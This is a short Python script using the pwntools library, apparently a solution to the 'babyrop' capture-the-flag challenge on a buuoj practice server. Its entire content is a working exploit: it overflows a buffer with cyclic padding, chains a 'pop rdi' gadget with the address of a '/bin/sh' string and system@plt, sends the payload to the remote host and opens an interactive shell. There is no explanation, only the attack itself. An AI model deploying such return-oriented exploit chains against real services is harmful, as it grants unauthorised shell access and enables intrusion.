from pwn import *

# io = process('babyrop')
io = remote('node4.buuoj.cn', 29602)
elf = ELF('babyrop')
pop_rdi_ret = 0x400683
system_addr = elf.plt['system']
bin_sh_addr = 0x601048

payload = cyclic(0x18) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendline(payload)
io.interactive()

